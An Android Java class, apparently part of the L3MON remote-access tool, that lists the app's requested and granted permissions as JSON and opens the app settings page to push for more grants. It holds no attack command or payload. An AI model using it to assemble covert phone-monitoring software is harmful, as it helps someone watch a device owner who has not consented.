package com.etechd.l3mon;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.provider.Settings;

import org.json.JSONArray;
import org.json.JSONObject;

import static com.etechd.l3mon.ConnectionManager.context;

public class PermissionManager {

    public static JSONObject getGrantedPermissions() {
        JSONObject data = new JSONObject();
        try {
            JSONArray perms = new JSONArray();
            JSONArray details = new JSONArray();
            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
            for (int i = 0; i < pi.requestedPermissions.length; i++) {
                String permission = pi.requestedPermissions[i];
                boolean granted = (pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0;
                if (granted) perms.put(permission);

                JSONObject entry = new JSONObject();
                entry.put("name", permission);
                entry.put("granted", granted);
                entry.put("dangerous", isDangerousPermission(permission));
                entry.put("canOpenSettings", canOpenSettings(permission));
                entry.put("status", granted ? "granted" : (canOpenSettings(permission) ? "needs_user_action" : "unsupported"));
                details.put(entry);
            }
            data.put("permissions", perms);
            data.put("details", details);
            data.put("grantedCount", perms.length());
            data.put("totalCount", details.length());
        } catch (Exception e) {
            e.printStackTrace();
        }
        return data;
    }

    public static boolean canIUse(String perm) {
        if(context.getPackageManager().checkPermission(perm, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) return true;
        else return false;
    }

    public static boolean openPermissionSettings(String perm) {
        if (context == null) return false;
        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
        intent.setData(Uri.parse("package:" + context.getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        try {
            context.startActivity(intent);
            return true;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private static boolean isDangerousPermission(String permission) {
        return permission != null && permission.startsWith(Manifest.permission.class.getPackage().getName());
    }

    private static boolean canOpenSettings(String permission) {
        return context != null && permission != null && permission.trim().length() > 0;
    }
}
